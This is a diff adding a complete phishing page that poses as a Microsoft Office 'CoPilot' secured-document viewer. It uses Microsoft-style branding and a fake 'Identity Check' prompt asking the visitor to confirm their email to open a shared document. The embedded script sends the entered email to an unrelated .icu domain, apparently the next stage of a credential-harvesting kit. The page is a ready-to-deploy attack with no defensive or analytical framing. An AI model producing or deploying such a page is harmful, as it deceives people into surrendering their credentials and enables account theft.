@@ -1,0 +1,143 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head> <meta charset="UTF-8">
+<meta http-equiv="Permissions-Policy" content="clipboard-read=(), clipboard-write=()">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- Add favicon (Microsoft logo) -->
+<link rel="icon" type="image/png" href="">
+<style>
+body {
+font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+background-color: #f4f4f4;
+margin: 0;
+display: flex;
+justify-content: center;
+align-items: center;
+height: 100vh;
+color: #333;
+background-image: url('https://i.ibb.co/GQ60Tg1N/image-1.jpg'); /* Default fallback image */
+background-size: cover;
+background-position: center;
+}
+.header {
+width: 100%;
+background-color: #0078d4;
+color: white;
+text-align: left;
+padding: 10px 20px;
+box-sizing: border-box;
+font-size: 18px;
+position: absolute;
+top: 0;
+}
+.header span {
+margin-left: 20px;
+}
+.container {
+background-color: white;
+border: 1px solid #ccc;
+border-radius: 3px;
+padding: 33px;
+width: 80%;
+max-width: 300px;
+box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+text-align: center;
+margin-top: 0px;
+}
+.container img {
+width: 100px;
+margin-bottom: 20px;
+}
+.container h2 {
+font-size: 24px;
+margin-bottom: 20px;
+color: #333;
+}
+.container p {
+margin-bottom: 10px;
+color: #666;
+}
+.container p2 {
+margin-bottom: 10px;
+color: #666;
+font-size: 13px;
+margin-bottom: 20px;
+}
+.container input[type="email"] {
+width: 100%;
+padding: 10px;
+margin-bottom: 20px;
+border: 1px solid #ccc;
+border-radius: 3px;
+font-size: 16px;
+box-sizing: border-box;
+text-align: center;
+}
+.container button {
+width: 100%;
+padding: 10px;
+background-color: #0078d4;
+color: white;
+border: none;
+border-radius: 3px;
+font-size: 16px;
+cursor: pointer;
+}
+.container button:hover {
+background-color: #005a9e;
+}
+.container .footer {
+font-size: 12px;
+color: #888;
+margin-top: 20px;
+}
+@media (max-width: 600px) {
+.container {
+padding: 20px;
+}
+.container h2 {
+font-size: 20px;
+}
+.container .space {
+margin-bottom: 20px;
+}
+.container input[type="email"] {
+font-size: 14px;
+}
+.container button {
+font-size: 14px;
+}
+}
+</style><title>Identity Check</title>
+</head><body>
+<div class="header">
+<span>Document(s) CoPilot Default</span>
+</div>
+<div class="container">
+<img src="https://i.ibb.co/ddDMhzV/image-2.jpg" alt="maincase Logo">
+<h3><strong>You've received a secured document:</strong><p></p>
+<p>Organization Privacy needs to verify the intended recipient's email
+to continue with document. Please enter the email address of
+Organization to which document was shared.</p></h3>
+<input id="email" placeholder="Enter email" required="" style="margin-top: 10px;" type="email">
+<button onclick="submitEmail()">Open Document(s)</button>
+<p class="footer">By clicking open Office will process email address in accordance with your Organization privacy statement.</p>
+<p class="footer">© Copyright with 2025 Organization Privacy &amp; Cookies</p>
+</div> <script>
+function submitEmail() {
+const email = document.getElementById('email').value;
+// Check if email is valid
+if (validateEmail(email)) {
+const encodedEmail = (email); // Encode email to handle special characters
+window.location.href = `https://mintrokl.icu/5rwp3T8Z5b/#X${encodedEmail}`; // Redirect with email query
+} else {
+alert("Please enter a valid email address.");
+}
+}
+// Simple email validation function
+function validateEmail(email) {
+const re = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+return re.test(email);
+}
+</script>
+</body></html>
